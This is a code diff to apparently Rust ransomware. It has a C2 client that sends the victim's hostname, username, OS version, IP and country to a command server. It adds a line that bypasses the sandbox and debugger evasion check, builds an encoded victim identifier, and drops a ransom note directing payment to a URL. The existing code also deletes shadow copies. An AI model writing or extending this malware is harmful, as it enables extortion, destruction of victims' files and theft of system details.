@@ -1,14 +1,21 @@
 mod c2;
 mod encryption;
 mod system;
+use base64::{engine::general_purpose, Engine as _};
 use serde_json::json;
-use std::{env, fs::read_to_string, process::exit};
+use std::{
+    env,
+    fs::{read_to_string, File, OpenOptions},
+    io::Write,
+    process::exit,
+};
 
 #[tokio::main]
 async fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
-        if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected()
+        if 1 == 1
+            || !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected()
         {
             let c2 = c2::api::C2API::new();
 
@@ -20,10 +27,13 @@ async fn main() {
 
             let c2 = c2::api::C2API::new();
 
+            let host = system::info::get_hostname();
+            let hook_user = system::info::get_username();
+
             let body = json!({
                 "versionOS": system::info::get_version(),
-                "host": system::info::get_hostname(),
-                "hookUser": system::info::get_username(),
+                "host": host.clone(),
+                "hookUser": hook_user.clone(),
                 "ip": public_ip_info["data"]["ip"].to_string().replace("\"", "").replace("\\", ""),
                 "country": public_ip_info["data"]["country"].to_string().replace("\"", "").replace("\\", "")
             });
@@ -33,6 +43,10 @@ async fn main() {
                 println!("Error: {}", api_res["error"]["errorMsg"]);
                 exit(-1);
             }
+
+            let agent_tag = api_res["data"]["id"].to_string() + "#" + &host + "#" + &hook_user;
+            let encoded: String = general_purpose::STANDARD_NO_PAD.encode(agent_tag.as_bytes());
+
             // Clean received public key
             let private_public_key = api_res["data"]["publicKey"]
                 .to_string()
@@ -50,6 +64,17 @@ async fn main() {
                 api_res["data"]["id"].to_string(),
                 1,
             );
+
+            let mut file = OpenOptions::new()
+                .create_new(true)
+                .write(true)
+                .append(true)
+                .open("HELP_RECOVER_ALL_MY_FILES.txt")
+                .unwrap();
+            let message =
+                String::from("To recover your files please Go to https://192.168.10.121/userpay/")
+                    + &encoded;
+            file.write_all(message.as_bytes()).unwrap();
 
             system::file::delete_shadow_copies();
         }
